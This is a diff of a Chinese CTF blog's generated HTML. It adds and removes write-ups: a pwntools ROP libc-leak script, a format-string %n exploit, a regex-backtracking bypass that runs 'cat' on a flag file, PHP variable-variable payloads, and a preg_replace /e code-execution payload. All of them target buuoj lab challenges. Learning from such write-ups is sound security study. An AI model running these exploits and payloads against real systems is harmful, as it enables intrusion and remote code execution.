unquote(unquote(lines[i],<span class="string">&#x27;utf-8&#x27;</span>), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>out.txt</p>
+<p>能力有限，我无法直接光提取sql语句了，但是我想到通过 搜索功能、</p>
+</blockquote>
+<p>(select flag from flag),15,1)，第一条的结果上方就是(select flag from flag),14,1)的最后一位，即第14位的Ascii码值了</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-7-01.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result = <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">49</span>, <span class="number">113</span>, <span class="number">119</span>, <span class="number">121</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">125</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(result)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(result[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻防世界-流量分析2"><a href="#攻防世界-流量分析2" class="headerlink" title="攻防世界 - 流量分析2"></a>攻防世界 - 流量分析2</h2><p>导出Http对象，发现每个包中都有几个字符，观察发现拼接起来就是flag</p>
+<p>我做的时候没看到ag只有fl，手动加上ag 提交成功</p>
 
       
     </div>
@@ -339,7 +795,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-04-01 00:04:23" itemprop="dateModified" datetime="2024-04-01T00:04:23+08:00">2024-04-01</time>
+      <time title="Modified: 2024-04-08 00:38:26" itemprop="dateModified" datetime="2024-04-08T00:38:26+08:00">2024-04-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -372,14 +828,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>9.8k</span>
+      <span>10k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>18 mins.</span>
+      <span>19 mins.</span>
     </span>
 </div>
 
@@ -530,6 +986,21 @@
 <p><strong>找不到system和binsh，很明显要通过构造Rop寻找libc</strong></p>
 <p>题目提供了libc文件</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27244</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = offest + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh_addr = offest + libc.search(&#x27;bin/sh&#x27;).next()</span></span><br><span class="line">bin_sh_addr = offest + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Buu-jarvisoj-fm-fm-n任意内存写入"><a href="#Buu-jarvisoj-fm-fm-n任意内存写入" class="headerlink" title="Buu - jarvisoj_fm[ fm %n任意内存写入]"></a>Buu - jarvisoj_fm[ fm %n任意内存写入]</h2><p>checksec一下 32位，用IDA打开</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-00.png"></p>
+<p><strong>思路：</strong></p>
+<p>要想shell，肯定要满足x&#x3D;&#x3D;4；</p>
+<p>然后又看到有<code>printf(buf)</code> 格式化字符串漏洞标志</p>
+<p>&#x3D;&gt; 通过%n向x地址写入4</p>
+<p><strong>1.确定偏移量</strong></p>
+<p>这是32位程序，第一个参数可以写入AAAA &#x3D; ( 正好占满一个栈的小格子(4字节)的空间 )</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-01.png"></p>
+<p>-&gt; %08，让长度为8，比较容易好看吧，这个无所谓</p>
+<p>-&gt; %x(打印十六进制数据) 或者 %p(打印栈上数据)均可</p>
+<p>&#x3D;&#x3D;&gt; 偏移量为11</p>
+<p><strong>2.通过<code>%(偏移量)$n</code>来写入值</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if语句中可以调用system(&#x27;bin/sh&#x27;) =&gt; 满足if语句</span></span><br><span class="line"><span class="comment"># 让x=4</span></span><br><span class="line"><span class="comment"># x - addr：0804A02C</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25301</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./fm&#x27;)</span></span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">&quot;%11$n&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 
       
@@ -817,7 +1288,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-03-28 18:17:16" itemprop="dateModified" datetime="2024-03-28T18:17:16+08:00">2024-03-28</time>
+      <time title="Modified: 2024-04-08 00:40:48" itemprop="dateModified" datetime="2024-04-08T00:40:48+08:00">2024-04-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -850,14 +1321,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>14k</span>
+      <span>16k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>26 mins.</span>
+      <span>29 mins.</span>
     </span>
 </div>
 
@@ -1123,6 +1594,37 @@
 <p>如果回溯次数超过上限 &#x3D;&gt; 返回false</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://21f64b23-2c68-4e4c-9a97-3a552fe3e8d7.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>:<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;haha&quot;:&quot;&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
 
+<h2 id="BJDCTF2020-Mark-loves-cat-git泄露-可变变量"><a href="#BJDCTF2020-Mark-loves-cat-git泄露-可变变量" class="headerlink" title="[BJDCTF2020]Mark loves cat [.git泄露 - 可变变量]"></a>[BJDCTF2020]Mark loves cat [.git泄露 - 可变变量]</h2><p><strong>.git泄露</strong></p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/4-7-00.png"></p>
+<p><strong>flag.php</strong>内不是flag，<code>$flag = file_get_contents(&#39;/flag&#39;);</code> &#x3D;&#x3D;&#x3D;&gt; flag变量中保存了flag值</p>
+<p><strong>index.php</strong>中有一段php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123; <span class="comment"># $x是键名 $y是对应键值</span></span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>; <span class="comment"># POST：a=flag =&gt; $a = flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>; <span class="comment"># GET：a=flag =&gt; $a = $flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>1.利用<code>exit($handsome)</code></strong></p>
+<p>Payload：<code>url/index.php?handsome=flag&amp;flag=a&amp;a=flag</code></p>
+<p>-&gt; 利用exit()函数输出flag，肯定是要先将handsome指向flag变量的</p>
+<p>-&gt; 前提是满足这个if语句，GET方法的传参</p>
+<p>-&gt; GET方法就会在前面引起 <code>foreach($_GET as $x =&gt; $y)</code></p>
+<p>-&gt; 故 flag&#x3D;a&amp;a&#x3D;flag  -&gt; <code>if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)</code> </p>
+<p>&#x3D;&#x3D;&gt; a &#x3D; a &amp;&amp; a !&#x3D;&#x3D; ‘flag’ 满足</p>
+<p> <strong>2.利用<code>exit($yds);</code></strong></p>
+<p>Payload：<code>url/index.php?yds=flag</code></p>
+<p>-&gt; 由于用到了GET方法，会GET的foreach遍历</p>
+<p>-&gt; $yds &#x3D; $flag 且满足if语句，且能够输出flag</p>
+<p><strong>3.利用<code>exit($is);</code></strong></p>
+<p>Payload：<code>url/index.php?is=flag&amp;flag=flag</code></p>
+<p>-&gt; 肯定的首先是 is&#x3D;flag</p>
+<p>-&gt; 要想进入这个if，肯定存在一个GET或POST方法传入的flag&#x3D;flag</p>
+<p>-&gt; GET：flag&#x3D;flag 还是会经历foreach的GET遍历</p>
+<p>&#x3D;&gt; $flag &#x3D; $flag</p>
+<p>-&gt; 接上前面的is&#x3D;flag &#x3D;&gt; $is &#x3D; $flag&#x3D;$flag</p>
+<p><strong>4.利用<code>echo &quot;the flag is: &quot;.$flag;</code></strong></p>
+<p>Payload：<code>1=flag&amp;flag=1</code></p>
+<p>-&gt; 不进入两个if语句，</p>
+<p>-&gt; 这里用到的是 <code>1=flag&amp;flag=1</code></p>
+<p><strong>-&gt; 具体为什么这样可以我也不知道。</strong></p>
+<p>-&gt; 看别人写的说的是当经过foreach遍历时，1作为变量是 类型是int，flag是字符串，类型不一样所以不满足if语句</p>
+<p>还是要多想想。</p>
 
       
     </div>
@@ -1812,302 +2314,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Li1x">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Li1x's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Li1x's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" class="post-title-link" itemprop="url">BUU-ZJCTF,不过如此 - Wp</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2024-01-30 06:23:42" itemprop="dateCreated datePublished" datetime="2024-01-30T06:23:42+08:00">2024-01-30</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-03-26 01:42:39" itemprop="dateModified" datetime="2024-03-26T01:42:39+08:00">2024-03-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Web/BUU-ZJCTF,不过如此/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>2k</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>4 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/00.png" alt="00"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>1.使用php:&#x2F;&#x2F;input</p>
-<p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。<strong>当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
-<p><strong>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过。</strong></p>
-</blockquote>
-<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/01.png" alt="01"></p>
-<blockquote>
-<p>2.使用data协议</p>
-<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，<strong>当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
-</blockquote>
-<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/02.png" alt="02"></p>
-<p>next.php的内容</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><strong>1.preg_replace()的&#x2F;e模式存在命令执行漏洞		&#x2F;e -&gt; 可执行模式，此为PHP专有参数，例如preg_replace函数.</strong></p>
-<p><strong>知识学习</strong>（低版本php存在，新版本的php已经启用&#x2F;e）</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_20408491/article/details/75095055">https://blog.csdn.net/qq_20408491/article/details/75095055</a></p>
-<blockquote>
-<p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串，那这样要如何执行代码呢？</p>
-<p><strong>replacement</strong>可以包含\n形式或$n形式的逆向引用，n可以为0到99，\n表示匹配pattern第n个子模式的文本，\0表示匹配整个pattern的文本</p>
-</blockquote>
-<p><strong><code>\1</code> 在正则表达式中有自己的含义，</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数</span><br><span class="line"></span><br><span class="line">这里的 \1 实际上是匹配第一个子匹配项,我们拿 ripstech 官方给的 payload 进行分析，方便大家理解。官方 payload 为： /?.*=&#123;$&#123;phpinfo()&#125;&#125; ，即 GET 方式传入的参数名为 /?.* ，值为 &#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $str);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>
-
-<p><strong>2.此处由GET方法传入值，而GET方法传参时 -&gt; 当首字母为点号时，会被替换为下划线.</strong></p>
-<blockquote>
-<p><strong>\S*&#x3D;${phpinfo()}</strong></p>
-<p>\S 匹配任何非空白字符</p>
-</blockquote>
-<p><strong>3.PHP可变变量</strong></p>
-<p><code>payload \S\*=$&#123;phpinfo()&#125;</code></p>
-<blockquote>
-<p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
-</blockquote>
-<p>payload: <code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Web/BUU-Easy_Java/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Li1x">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Li1x's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Li1x's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/CTF/Web/BUU-Easy_Java/" class="post-title-link" itemprop="url">BUU-[RoarCTF 2019]Easy Java的Wp</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2024-01-30 06:20:41" itemprop="dateCreated datePublished" datetime="2024-01-30T06:20:41+08:00">2024-01-30</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-03-26 01:42:27" itemprop="dateModified" datetime="2024-03-26T01:42:27+08:00">2024-03-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/CTF/Web/BUU-Easy_Java/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Web/BUU-Easy_Java/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>1.4k</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>3 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
-<blockquote>
-<p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件<br>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p>
-</blockquote>
-<p><strong>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。狭义来说，servlet是指Java语言实现的一个接口。</strong></p>
